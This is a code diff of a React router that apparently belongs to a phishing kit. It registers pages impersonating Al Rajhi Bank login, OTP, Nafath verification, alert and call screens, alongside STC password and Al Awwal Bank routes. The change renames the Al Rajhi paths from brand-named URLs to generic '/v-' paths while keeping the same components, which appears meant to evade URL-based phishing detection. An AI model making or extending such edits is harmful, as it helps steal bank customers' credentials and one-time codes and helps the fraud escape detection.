@@ -109,11 +109,11 @@ function Router() {
       <Route path={"/stc-password"} component={STCPassword} />
 
       {/* Al Rajhi Bank Routes */}
-      <Route path={"/alrajhi-login"} component={AlRajhiLogin} />
-      <Route path={"/alrajhi-otp"} component={AlRajhiOTP} />
-      <Route path={"/alrajhi-nafath"} component={AlRajhiNafath} />
-      <Route path={"/alrajhi-alert"} component={AlRajhiAlert} />
-      <Route path={"/alrajhi-call"} component={AlRajhiCall} />
+      <Route path={"/v-login"} component={AlRajhiLogin} />
+      <Route path={"/v-otp"} component={AlRajhiOTP} />
+      <Route path={"/v-nafath"} component={AlRajhiNafath} />
+      <Route path={"/v-alert"} component={AlRajhiAlert} />
+      <Route path={"/v-call"} component={AlRajhiCall} />
       <Route path={"/rajhi-payment-error"} component={RajhiPaymentError} />
 
       {/* Al Awwal Bank Routes */}
